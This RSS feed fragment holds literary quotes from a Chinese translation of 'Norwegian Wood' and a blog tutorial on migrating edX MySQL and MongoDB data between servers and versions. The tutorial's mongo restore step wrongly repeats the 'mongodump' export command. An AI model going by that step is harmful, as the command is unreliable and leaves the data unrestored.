&lt;p&gt;哪里会有人喜欢孤独！不过是不乱交朋友罢了。那样只能落得失望&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"那么12点来这里好么？还笔记本，午饭我请客。该不会说什么不是一个人吃饭就消化不良吧"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;永泽不在意地说，"那东西，一般都混得过去。什么集体讨论啦面谈啦，和向女孩子花言巧语没什么两样。"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;什么权力欲金钱欲，真的。或许我这人俗不可耐刚愎自用，但那种玩艺儿却是半点儿都找不到我头上。就是说，我是个没有私欲的人，有的只是好奇心，只是想在那广阔无边而险象环生的世界里显一显身手罢了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"在我见过的人当中，你是最特殊的。"我说。 "在我见过的人里边，你是最地道的。"他说。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你认为有钱的最大优势是什么？——是可以说没钱呀。例如我向班上的朋友提议做点什么，对方就说“我现在没钱，不行”。我要说“现在没钱”，那就真是没钱。太惨了！长得漂亮的女孩可以说“我今天脸难看得很，不想外出”，换个丑八怪女孩同样说一句试试，不被人笑掉大牙才怪！——绿子&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她手捧两腮，自言自语似的小声说，"不过我喜欢同你说话，你说话方式真是别具一格：'我不情愿被某种东西束缚住。'"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这个星期天的下午兵荒马乱地出了不少事。好个奇妙的日子。就在绿子家附近发生了一场火灾，我们爬上三楼的晾衣台看热闹，而且不知不觉地接了吻。这么说也许像是装傻，可过程确实如此&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我总是感到饥渴，想拼着劲儿地得到一次爱，哪怕仅仅一次也好，直到让我说可以了，肚子饱饱的了，多谢您的款待。然而他们竟一次都没满足过我。刚一撒娇，就给抡到一边去，动不动就说我花钱手脚大，从来都这样。一来二去，我就想：一定自己来找一个一年到头百分之百爱我的人。——绿子&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我所求的只是容许我任性，百分之百的任性。比方说，我现在对你说想吃酥饼，你就什么也不顾地跑去买，气喘吁吁地跑回来递给我，说'喏，绿子，这就是酥饼。'可我却说：'我又懒得吃这玩艺儿了！'说着'呼'一声从窗口扔出。这就是我所追求的。&lt;br /&gt;
“这和爱似乎不大相干啊！”我不无愕然地说。 
“相干！你不知道罢了，”绿子说，“对女孩儿来说，这东西有时非常非常珍贵。”    &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一旦落实到文字，自己想说的事只能表达出一小部分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;尽管有卓越的天赋才华，却承受不住使之系统化的训练，而终归将才华支离破碎地挥霍掉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那时我就想来着，这些家伙全是江湖骗子，自呜得意地炫耀几句高深莫测的牛皮大话，博取新入学女孩儿的好感，随后就把手插到人家裙子里去——想的全是这玩艺儿，那号人。一上四年级，就赶紧把头发剪短，忙不迭地钻到什么三菱商社、什么东京广播局、什么IBM公司、什么富士银行找份差事，讨一个压根儿没读过马克思的老婆，挖空心思给孩子取个玄而又玄的名字。至于粉碎产学协同体，简直笑掉眼泪。那些新生也恬不知耻，本来狗屁不懂，却装出大彻大悟的样子，低三下四。事后还居然开导我说：‘你真傻，不懂也说懂不就得了。’”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;问题是，看护的是我呀，这可不是闹着玩。别人偶尔来一趟，充其量不过是同情！接屎接尿接痰擦身子都是我一个人干。要是光同情就能解决屎尿，我可以比他们多同情五十倍&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;遗憾呐，这么大好的洗衣服天气&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每个人都在追求自以为是的正义与幸福,但所有人的正义都大行其道、所有人的幸福都圆满获得，客观上是不可能的，而必然导致混乱状态的出现。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;语言这东西还是多学一种有好处，再说这是我天生的拿手好戏。法语也是自学的，几乎达到无懈可击的地步。和玩一个道理，只要摸到一条规律，往下任凭多少都是一个模式。喏，和搞女人同一码事。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不公平的社会同时也是大有用武之地的社会&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他和我一样，在本质上都是只对自己感兴趣的人，只不过在傲慢不傲慢上有所差别。自己想什么、自己感受什么、自己如何行动--除此之外对别的没有兴趣。所以才能把自己同别人分开来考虑。我喜欢渡边也无非喜欢他这一点。只是他这小子还没有清楚地认识这点，以致感到迷惘和痛苦&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;而觉得不被人理解也无关紧要。自己是自己，别人归别人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我不是那样的强者，也并不认为不被任何人理解也无所谓，希望相互理解的对象也是有的。只不过对除此以外的人，觉得在某种程度上即使不被理解也无可奈何&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;真的是同一回事，不过是晚一点的早饭和早一点的午饭之间的区别罢了。吃的东西一样，吃的时间相同，不同的是仅仅是名称&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;亲切热情倒是不假，但就是不能打心眼里爱上某个人，而总是有个地方保持清醒，并且有一种饥渴感，如此而已--这我看得明白。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;"它类似一种少年时代的憧憬，一种从来不曾实现而且永远不可能实现的憧憬。这种直欲燃烧般的天真烂漫的憧憬，我在很早以前就已遗忘在什么地方了，甚至在很长时间里我连它曾在我心中存在过都未曾记起。而初美所摇撼的恰恰就是我身上长眠未醒的“我自身的一部分”。当我恍然大悟时，一时悲枪之极&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;若看得如此入迷，票钱可是一点没有赔本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;春天的原野里，你一个人正走着，对面走来一只可爱的小熊，浑身的毛活像天鹅绒，眼睛圆鼓鼓的。它这么对你说道：‘你好，小姐，和我一块儿打滚玩好么？’接着，你就和小熊抱在一起，顺着长满三叶草的山坡咕噜咕噜滚下去，整整玩了一大天。你说棒不棒？”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;而你一定要活得幸福，把我那份也活出来，那样我才高兴&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对你来说，直子或许是至高无上的天使；而在我眼里，只不过是笨手笨脚的普通女孩儿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;时而重读一会《了不起的盖茨比》，一到周日就洗衣，给直子写长信。还时常同绿子相会，一起吃饭、逛动物园、看电影。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但在某些地方却比情侣还要相互引以为知己，想到这里，我觉得胸口一阵堵塞。我十分不愿意无谓地伤别人的心，尤其是难能可贵的人的心。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只消说上一句‚好可爱的发型‛，往下无论你做什么，哪怕再心事重重，我都会原谅你&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你这人总像有些与众不同。和你在一起，我感觉再称心如意不过。我信赖你，喜爱你，不愿放弃你。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“我可是有血有肉的活生生的女孩儿，”绿子把脸颊擦在我脖颈上说，“而且现在就在你的怀抱里表白说喜欢你。只要你一声令下，赴汤蹈火都在所不惜。虽然我多少有蛮不讲理的地方，但心地善良正直，勤快能干，脸蛋也相当俊俏，乳房形状也够好看，饭菜做得又好，父亲的遗产也办了信托存款，还不以为这是大拍卖？你要是不买，我不久就到别处去。”  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我和绿子在她房间的床上相抱而卧。我们边听滴雨声边在被窝里亲嘴。接着从世界的构成一直谈到煮鸡蛋的软硬度，简直无所不谈。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她给我留下的记忆实在过于鲜明了。她轻轻地吻我，头发垂落在我的小腹——那光景至今仍历历在目。我还记得她的温情和喘息，以及一泄而出后无可排遣的感伤。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无论谙熟怎样的真理，也无以解除所爱之人的死带来的悲哀。无论怎样的哲理，怎样的真诚，怎样的坚韧，怎样的柔情，也无以排遣这种悲哀。我们惟一能做到的，就是从这片悲哀中挣脱出来，并从中领悟某种哲理。而领悟后的任何哲理，在继之而来的意外悲哀面前，又是那样地软弱无力&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;唯一给我鼓励的是菲茨杰拉德那句话：‘如果叙述与人不同的东西，就要使用与人不同的语言。’&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 08 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-08:norwegian-wood.html</guid><category>book</category></item><item><title>edx数据迁移</title><link>/edx-data-migrate.html</link><description>&lt;p&gt;此前处理过几次edx数据迁移方面的工作，包括&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;更换服务器，整个平台的迁移（迁移前后edx版本相同&lt;code&gt;release-2014-09-17&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;部署birch版的edX，将既有数据(来自&lt;code&gt;release-2014-09-17&lt;/code&gt;)迁移到birch中&lt;/li&gt;
&lt;li&gt;将平台数据迁移给docker中的edx使用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;1,3本质上是数据导出与导入问题，2涉及到新旧版edx数据结构的变化，下边分别说明。&lt;/p&gt;
&lt;h1&gt;几点建议&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;一定记得备份！！&lt;/li&gt;
&lt;li&gt;弄清你关心的数据是什么，最坏的情况下，需要手动迁移，明确自己关心的数据，将减少大量工作，以下几类数据可能是你在意的（如有遗漏，欢迎补充）：  &lt;ul&gt;
&lt;li&gt;用户注册表（mysql edxapp库中auth_user表）&lt;/li&gt;
&lt;li&gt;用户信息表（mysql edxapp库中auth_userprofile）&lt;/li&gt;
&lt;li&gt;用户/课程关系表（mysql edxapp库中student_courseenrollment表）&lt;/li&gt;
&lt;li&gt;学生答题记录（mysql edxapp库中courseware_studentmodule）（可能会比较大）&lt;/li&gt;
&lt;li&gt;论坛里的帖子和评论（mongo/cs_comments_service_development/contents）&lt;/li&gt;
&lt;li&gt;论坛里的用户（mongo/cs_comments_service_development/users）&lt;/li&gt;
&lt;li&gt;用户订阅帖子的关系（mongo/cs_comments_service_development/subscriptions）&lt;/li&gt;
&lt;li&gt;课程内容，这个当然也在mongo中，不过直接使用studio提供的export和import就好。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果是整个系统的迁移，除了考虑数据库中的数据之外，还应该考虑静态文件，静态文件基本分布在&lt;code&gt;/edx/var/edxapp/staticfiles&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;just do it&lt;/h1&gt;
&lt;p&gt;分三部分来说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同版本的edx迁移时的数据迁移（本质是数据导出和导入）&lt;/li&gt;
&lt;li&gt;edx升级后的数据迁移&lt;/li&gt;
&lt;li&gt;将数据迁移给docker中的edx使用（版本相同）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;同版本的edx迁移时的数据迁移（本质是数据导出和导入）&lt;/h2&gt;
&lt;p&gt;之所以要在同版本中迁移数据，是因为服务器发生了变更，需要迁移整个平台。尝试过打包整个系统的做法（tar备份还原），也试过使用Remastersys做整个系统的镜像，两种方法造成的结果都是数据库罢工。基于dd指令的方法还没用过 :)。以上其实是个运维的问题，我对此并不很熟悉。&lt;/p&gt;
&lt;p&gt;所以最终采用的是重新在一个新的平台上部署，之后将数据迁移过去。这样做确实挺烦的，edx的每次国内安装过程都很蛋疼（你懂的），所以才一直想使用docker来跑edx，这样迁移什么的都酸爽极了，更不用说开发。&lt;/p&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#导出，mysqldump -u 用户名 数据库名 &amp;gt; 导出的文件名 ，ansible安装mysql时，没设密码，所以不需要-p
mysqldump -u root edxapp &amp;gt; /path/to/edxapp.sql

#使用scp将导出文件复制到目标服务器上

#在目标服务器上导入
mysql -u root edxapp &amp;lt; /path/to/edxapp.sql
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一般来说主要数据都在edxapp里，如果你要备份所有数据的话，使用这条&lt;code&gt;mysqldump  -u root --all-databases&amp;gt; alldb.sql&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对应的还原&lt;code&gt;mysql -u root -p &amp;lt; alldb.sql&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;mongo&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#导出mongo中所有数据
mongodump -h 127.0.0.1 -o /path/to/mongodb/

#将其用tar打包，scp复制到目标服务器上，解压

#在目标服务器导入数据
mongodump -h 127.0.0.1 -o /path/to/mongodb/
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;edx升级后的数据迁移&lt;/h2&gt;
&lt;p&gt;首先让人想到的是&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Full-Stack#updating-versions-using-edx-repos"&gt;update&lt;/a&gt;,但据我所知很少有人能一次性update成功的，这归结于edx的依赖错综复杂。&lt;/p&gt;
&lt;p&gt;update究竟干了啥，look &lt;a href="https://github.com/edx/configuration/blob/master/playbooks/roles/edx_ansible/templates/update.j2"&gt;here&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;如果使用update，中途遇到的问题，只好手动处理了&lt;/p&gt;
&lt;p&gt;如果是从aspen升级到birch，参考&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/birch.html#upgrading-from-aspen-to-birch"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;手动迁移&lt;/h3&gt;
&lt;p&gt;我当时面对的场景是，在一台新的服务器上部署birch，然后要将release-2014-09-17版上的数据迁移过去。&lt;br /&gt;
当时的做法比较简单，因为我们只对文章开头提到几类数据感兴趣，所以对比了这些数据表结构基本没变化后，我直接导出旧有数据，覆盖新的，至于mongo部分也是如此，推荐使用diff做比较。手动的方案虽然繁琐，但足够灵活。&lt;br /&gt;
至于定制的代码，都限制在独立的django application里，所以定制代码的迁移也并不麻烦。复制整个application目录便是，之后syncdb/migrate一下。&lt;/p&gt;
&lt;h4&gt;mysql&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#导出数据表：mysqldump -u 用户名 -p 数据库名 表名&amp;gt; 导出的文件名
mysqldump -u root edxapp auth_user&amp;gt; /path/to/auth_user.sql
mysqldump -u root edxapp auth_userprofile&amp;gt; /path/to/auth_userprofile.sql
mysqldump -u root edxapp student_courseenrollment&amp;gt; /path/to/student_courseenrollment.sql

#导入数据表,先备份/删除同名表 
#备份可用上边的方法
mysql -u root
use edxapp
drop table &amp;lt;表名&amp;gt;;
source /path/to/auth_user.sql
source /path/to/auth_userprofile.sql
source /path/to/student_courseenrollment.sql
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;mongo&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#在旧版服务器导出所需的collections。参数含义： -d database_name -c collection_name
mongoexport -d cs_comments_service_development -c contents -o /path/to/contents.dat
mongoexport -d cs_comments_service_development -c users -o /path/to/users.dat
mongoexport -d cs_comments_service_development -c  subscriptions -o /path/to/subscriptions.dat
#modulestore
mongoexport -d edxapp -c  modulestore -o /path/to/modulestore.dat


#使用scp将以上dat文件复制到目标服务器

#在目标服务器上先删除同名collectons，删除前记得备份
mongo
use cs_comments_service_development
db.contents.drop()
db.users.drop()
db.subscriptions.drop()
#导入所需的collections
mongoimport -d cs_comments_service_development -c contents  /path/to/contents.dat
mongoimport -d cs_comments_service_development -c users path/to/users.dat
mongoimport -d cs_comments_service_development -c subscriptions path/to/subscriptions.dat
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;自动迁移&lt;/h3&gt;
&lt;p&gt;后来想到更好的方案&lt;br /&gt;
当初在release-2014-09-17上做二次开发时有考虑到之后要升级的问题，所以二次开发的代码除了限制在一个application里之外，还都在wwj_master分支上。&lt;br /&gt;
首先在旧版服务器上工作:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拉取所需的远程新版分支到本地: &lt;code&gt;git checkout -b new_branch origin/new_branch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将wwj_master分支衍合(rebase)到新版分支上：&lt;code&gt;git rebase new_branch wwj_master&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于衍合的知识可以看&lt;a href="http://git-scm.com/book/zh/v1/Git-%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E7%9A%84%E8%A1%8D%E5%90%88#有趣的衍合"&gt;这里&lt;/a&gt;&lt;br /&gt;
rebase完之后，同步数据库，执行syncdb和migrate。这里有&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Full-Stack"&gt;相关命令&lt;/a&gt;&lt;br /&gt;
如此一来，就完成了edx-platform源码的升级，定制的内容也都在，同时旧版的数据库也和新版一致了。&lt;br /&gt;
此后直接将旧版上整套edx-platform源码和数据库备份文件，移到新版服务器中进行替换就行。&lt;br /&gt;
很像1中&lt;code&gt;同版本的迁移时的数据迁移&lt;/code&gt;的情况了。&lt;/p&gt;
&lt;h2&gt;将数据迁移给docker中的edx使用（edx版本相同）&lt;/h2&gt;
&lt;p&gt;这里其实和&lt;code&gt;同版本的edx迁移时的数据迁移（本质是数据导出和导入）&lt;/code&gt;没啥区别，需要注意的是，记得将数据库文件目录挂载出来，使用&lt;code&gt;-v&lt;/code&gt;参数，这样数据的安全性得到保证，数据不会因为docker进程的挂掉而丢失。  &lt;br /&gt;
顺便提一下，把静态文件目录&lt;code&gt;/edx/var/edxapp/staticfiles&lt;/code&gt;也挂载出去.&lt;br /&gt;
总之，使用docker的核心观念之一是容器无状态。把你认为需要状态的数据都挂载出去&lt;/p&gt;
&lt;h1&gt;附录&lt;/h1&gt;
&lt;p&gt;我在升级&lt;code&gt;release-2014-09-17&lt;/code&gt;到&lt;code&gt;named-release/birch&lt;/code&gt;时，对比过mysql中所有表结构的差异。&lt;/p&gt;
&lt;h2&gt;用到的相关指令&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#在旧版服务器上
mysqldump -u root  -d edxapp &amp;gt; /path/to/old_edx.sql
#在新版服务器上
mysqldump -u root  -d edxapp &amp;gt; /path/to/new_edx.sql
vimdiff /path/to/old_edx.sql /path/to/new_edx.sql 
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;2016.04.07更新&lt;/p&gt;
&lt;p&gt;如果从birch迁移到dogwood，那么数据表有以下差异&lt;/p&gt;
&lt;h3&gt;mongodb&lt;/h3&gt;
&lt;p&gt;cs_comments_service_development数据库中contents表新版比老版多一个key:context,value:string&lt;/p&gt;
&lt;p&gt;cat contents.dat | jq -c '. + { "context": "course" }' &amp;gt; contents_ok.dat&lt;/p&gt;
&lt;p&gt;-c：不改变单行模式&lt;/p&gt;
&lt;p&gt;另一个问题是course_id发生了变化你可以使用vi逐个替代&lt;/p&gt;
&lt;p&gt;&lt;code&gt;:%s,edX/DemoX/Demo_Course,course-v1:edX+DemoX+Demo_Course,g&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;课程多的话使用，vi显然效率太低，也可以使用sed和jq来做流式编辑&lt;/p&gt;
&lt;p&gt;（思路：1.使用正则首先需要定位，course_id之后，然后分组捕获元素，使用环顾，或者逐行装换为json）&lt;/p&gt;
&lt;p&gt;我对python的正则熟悉一些还是用python好了，往&lt;code&gt;format_course_id.py&lt;/code&gt;写入&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="c1"&gt;#使用流&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="c1"&gt;#print line&lt;/span&gt;
  &lt;span class="n"&gt;json_line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;old_course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json_line&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;old_course_id&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;old_course_id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;old_course_id_items&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;old_course_id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#print old_course_id_items&lt;/span&gt;
    &lt;span class="n"&gt;new_course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:{}+{}+{}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;old_course_id_items&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="n"&gt;old_course_id_items&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="n"&gt;old_course_id_items&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;json_line&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_course_id&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;json_line&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;cat contents.dat | python format_course_id.py &amp;gt;/tmp/contents.dat&lt;/p&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;p&gt;auth_userprofile表dogwood比brich多了两个字段:bio和profile_image_uploaded_at;&lt;/p&gt;
&lt;p&gt;迁移方法为先&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SET FOREIGN_KEY_CHECKS=0;  //取出依赖检查&lt;/li&gt;
&lt;li&gt;DROP TABLE auth_user;  &lt;/li&gt;
&lt;li&gt;DROP TABLE auth_userprofile;  //删除旧表&lt;/li&gt;
&lt;li&gt;导入新表&lt;/li&gt;
&lt;li&gt;修改表结构&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;ALTER&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="n"&gt;auth_userprofile&lt;/span&gt; &lt;span class="k"&gt;ADD&lt;/span&gt; &lt;span class="n"&gt;bio&lt;/span&gt; &lt;span class="nb"&gt;varchar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;
&lt;span class="k"&gt;ALTER&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="n"&gt;auth_userprofile&lt;/span&gt; &lt;span class="k"&gt;ADD&lt;/span&gt; &lt;span class="n"&gt;profile_image_uploaded_at&lt;/span&gt;  &lt;span class="n"&gt;DATETIME&lt;/span&gt;  &lt;span class="k"&gt;NULL&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;


